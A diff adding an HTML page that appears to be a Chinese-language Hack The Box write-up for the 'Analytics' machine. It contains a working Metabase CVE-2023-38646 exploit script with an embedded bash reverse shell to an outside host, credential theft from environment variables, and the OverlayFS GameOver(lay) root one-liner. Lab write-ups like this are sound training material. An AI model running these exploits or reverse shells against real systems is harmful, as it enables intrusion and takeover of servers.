@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB: Analytics | HackwithControler</title>
+<link rel="stylesheet" href="../static/css/main.css">
+</head>
+<body>
+<header>
+    <div class="container">
+        <a href="../index.html" class="back">← 返回首頁</a>
+    </div>
+</header>
+
+<div class="article-layout">
+    <!-- Left Sidebar: Article List -->
+    <aside class="sidebar-left">
+        <h3>📝 其他 Write-ups</h3><div class="sidebar-articles">
+            <a href="htb_pilgrimage.html" class="sidebar-article-item">
+                <div class="sidebar-article-title">HTB: Pilgrimage</div>
+                <div class="sidebar-article-meta">
+                    <span class="sidebar-difficulty easy">Easy</span>
+                    <span>2024-09-18</span>
+                </div>
+            </a>
+            <a href="htb_keeper.html" class="sidebar-article-item">
+                <div class="sidebar-article-title">HTB: Keeper</div>
+                <div class="sidebar-article-meta">
+                    <span class="sidebar-difficulty easy">Easy</span>
+                    <span>2024-10-05</span>
+                </div>
+            </a>
+            <a href="htb_surveillance.html" class="sidebar-article-item">
+                <div class="sidebar-article-title">HTB: Surveillance</div>
+                <div class="sidebar-article-meta">
+                    <span class="sidebar-difficulty medium">Medium</span>
+                    <span>2024-11-20</span>
+                </div>
+            </a>
+            <a href="htb_analytics.html" class="sidebar-article-item active">
+                <div class="sidebar-article-title">HTB: Analytics</div>
+                <div class="sidebar-article-meta">
+                    <span class="sidebar-difficulty easy">Easy</span>
+                    <span>2024-12-15</span>
+                </div>
+            </a></div>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="article-main">
+        <div class="article-header">
+            <h1>HTB: Analytics</h1>
+            <div class="article-meta">
+                <span class="difficulty easy">Easy</span>
+                <span>📅 2024-12-15</span>
+                <span>⏱ 23 min read</span>
+            </div>
+            <div class="article-tags"><span class="article-tag">HTB</span><span class="article-tag">Linux</span><span class="article-tag">CVE-2023-38646</span><span class="article-tag">Metabase</span><span class="article-tag">Docker</span></div>
+        </div>
+        <div class="article-content"><h2 id="_1">機器資訊</h2>
+<ul>
+<li>平台: Hack The Box</li>
+<li>難度: Easy</li>
+<li>IP: 10.10.11.233</li>
+<li>作業系統: Linux</li>
+</ul>
+<h2 id="_2">偵察階段</h2>
+<p>首先進行 Nmap 掃描：</p>
+<pre class="codehilite"><code class="language-bash">nmap -sC -sV -oN nmap/initial 10.10.11.233
+</code></pre>
+
+<p>掃描結果：<br />
+- <strong>22/tcp</strong> - SSH (OpenSSH 8.2p1)<br />
+- <strong>80/tcp</strong> - HTTP (nginx 1.18.0)</p>
+<p>訪問 80 端口發現一個數據分析平台，使用 Metabase 0.46.6 版本。</p>
+<h2 id="_3">漏洞分析</h2>
+<h3 id="cve-2023-38646-metabase-pre-auth-rce">CVE-2023-38646 - Metabase Pre-Auth RCE</h3>
+<p>Metabase 版本 0.46.6 存在一個嚴重的預認證遠程代碼執行漏洞：</p>
+<ol>
+<li>攻擊者可以通過 <code>/api/setup/validate</code> 端點</li>
+<li>利用 setup token 繞過認證</li>
+<li>執行任意 H2 SQL 查詢</li>
+<li>通過 JDBC 連接字符串實現 RCE</li>
+</ol>
+<h3 id="setup-token">取得 Setup Token</h3>
+<pre class="codehilite"><code class="language-bash">curl -s http://10.10.11.233/api/session/properties | jq -r '.[&quot;setup-token&quot;]'
+</code></pre>
+
+<p>得到 token: <code>249fa03d-fd94-4d5b-b94f-b4ebf3df681f</code></p>
+<h2 id="initial-access">Initial Access</h2>
+<p>使用公開的 POC 腳本進行攻擊：</p>
+<pre class="codehilite"><code class="language-python">import requests
+import base64
+
+target = &quot;http://10.10.11.233&quot;
+setup_token = &quot;249fa03d-fd94-4d5b-b94f-b4ebf3df681f&quot;
+
+# Reverse shell payload
+payload = f&quot;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.15/4444 0&gt;&amp;1'&quot;
+encoded = base64.b64encode(payload.encode()).decode()
+
+# Exploit
+exploit = {
+    &quot;token&quot;: setup_token,
+    &quot;details&quot;: {
+        &quot;is_on_demand&quot;: False,
+        &quot;is_full_sync&quot;: False,
+        &quot;is_sample&quot;: False,
+        &quot;cache_ttl&quot;: None,
+        &quot;refingerprint&quot;: False,
+        &quot;auto_run_queries&quot;: True,
+        &quot;schedules&quot;: {},
+        &quot;details&quot;: {
+            &quot;db&quot;: f&quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;INIT=CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException {{ Runtime.getRuntime().exec(new String[]{{\&quot;bash\&quot;,\&quot;-c\&quot;,cmd}}); }}$$\\;CALL SHELLEXEC('echo {encoded} | base64 -d | bash')&quot;,
+            &quot;advanced-options&quot;: False,
+            &quot;ssl&quot;: True
+        },
+        &quot;name&quot;: &quot;x&quot;,
+        &quot;engine&quot;: &quot;h2&quot;
+    }
+}
+
+requests.post(f&quot;{target}/api/setup/validate&quot;, json=exploit)
+</code></pre>
+
+<p>開啟監聽並執行腳本：</p>
+<pre class="codehilite"><code class="language-bash">nc -lvnp 4444
+python3 exploit.py
+</code></pre>
+
+<p>成功取得 shell，身份為 <code>metabase</code> 用戶在 Docker 容器內。</p>
+<h2 id="_4">橫向移動</h2>
+<h3 id="_5">環境變數發現憑證</h3>
+<p>檢查環境變數：</p>
+<pre class="codehilite"><code class="language-bash">env | grep -i pass
+</code></pre>
+
+<p>發現：</p>
+<pre class="codehilite"><code>META_USER=metalytics
+META_PASS=An4lytics_ds20223#
+</code></pre>
+
+<p>嘗試 SSH 登入主機：</p>
+<pre class="codehilite"><code class="language-bash">ssh metalytics@10.10.11.233
+# 使用密碼: An4lytics_ds20223#
+</code></pre>
+
+<p>成功登入！取得 user flag：</p>
+<pre class="codehilite"><code class="language-bash">cat /home/metalytics/user.txt
+</code></pre>
+
+<h2 id="_6">權限提升</h2>
+<h3 id="_7">系統資訊收集</h3>
+<pre class="codehilite"><code class="language-bash">uname -a
+# Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu
+</code></pre>
+
+<p>這是 Ubuntu 22.04，kernel 版本 6.2.0-25 存在已知的權限提升漏洞。</p>
+<h3 id="cve-2023-2640-cve-2023-32629-ubuntu-overlayfs">CVE-2023-2640 &amp; CVE-2023-32629 - Ubuntu OverlayFS</h3>
+<p>這兩個漏洞允許本地用戶通過濫用 OverlayFS 的 copy_up 功能實現權限提升。</p>
+<p>使用 GameOver(lay) 一行命令提權：</p>
+<pre class="codehilite"><code class="language-bash">unshare -rm sh -c &quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot; &amp;&amp; u/python3 -c 'import os;os.setuid(0);os.system(&quot;bash&quot;)'
+</code></pre>
+
+<p>命令解析：<br />
+1. 創建 overlay 文件系統結構<br />
+2. 複製 python3 到 lower 目錄<br />
+3. 設置 CAP_SETUID capability<br />
+4. 掛載 overlay<br />
+5. 觸發 copy_up 操作<br />
+6. 利用 python 提權到 root</p>
+<p>執行後成功獲得 root shell：</p>
+<pre class="codehilite"><code class="language-bash">id
+# uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
+
+cat /root/root.txt
+</code></pre>
+
+<h2 id="flags">Flags</h2>
+<pre class="codehilite"><code>user.txt: 7********************************3
+root.txt: b********************************8
+</code></pre>
+
+<h2 id="_8">總結</h2>
+<p>這台機器展示了兩個重要的安全概念：</p>
+<ol>
+<li><strong>CVE-2023-38646 (Metabase RCE)</strong>: 應用程序預認證漏洞的危害性，強調了及時更新軟件的重要性</li>
+<li><strong>Kernel 權限提升</strong>: Ubuntu OverlayFS 漏洞提醒我們保持系統核心更新的必要性</li>
+</ol>
+<h3 id="_9">防禦建議</h3>
+<ul>
+<li>升級 Metabase 至最新版本 (&gt;0.46.6.1)</li>
+<li>更新 Linux kernel 修補 OverlayFS 漏洞</li>
+<li>避免在環境變數中存儲明文密碼</li>
+<li>實施最小權限原則</li>
+<li>定期進行安全審計</li>
+</ul>
+<h2 id="_10">參考資料</h2>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-38646">CVE-2023-38646 - Metabase RCE</a></li>
+<li><a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629">Ubuntu OverlayFS Exploit</a></li>
+<li><a href="https://www.metabase.com/blog/security-advisory">Metabase Security Advisory</a></li>
+</ul></div>
+    </main>
+
+    <!-- Right Sidebar: TOC -->
+    <aside class="sidebar-right">
+        <h3>📑 目錄</h3><ul class="toc-list">
+            <li class="toc-item toc-item-h2">
+                <a href="#_1" class="toc-link">機器資訊</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#_2" class="toc-link">偵察階段</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#_3" class="toc-link">漏洞分析</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#cve-2023-38646-metabase-pre-auth-rce" class="toc-link">CVE-2023-38646 - Metabase Pre-Auth RCE</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#setup-token" class="toc-link">取得 Setup Token</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#initial-access" class="toc-link">Initial Access</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#_4" class="toc-link">橫向移動</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_5" class="toc-link">環境變數發現憑證</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#_6" class="toc-link">權限提升</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_7" class="toc-link">系統資訊收集</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#cve-2023-2640-cve-2023-32629-ubuntu-overlayfs" class="toc-link">CVE-2023-2640 &amp;amp; CVE-2023-32629 - Ubuntu OverlayFS</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#flags" class="toc-link">Flags</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#_8" class="toc-link">總結</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_9" class="toc-link">防禦建議</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#_10" class="toc-link">參考資料</a>
+            </li></ul>
+    </aside>
+</div>
+
+<footer>
+    <div class="container">
+        <p>&copy; 2024 HackwithControler. All rights reserved.</p>
+    </div>
+</footer>
+
+<script src="../static/js/article.js"></script>
+</body>
+</html>
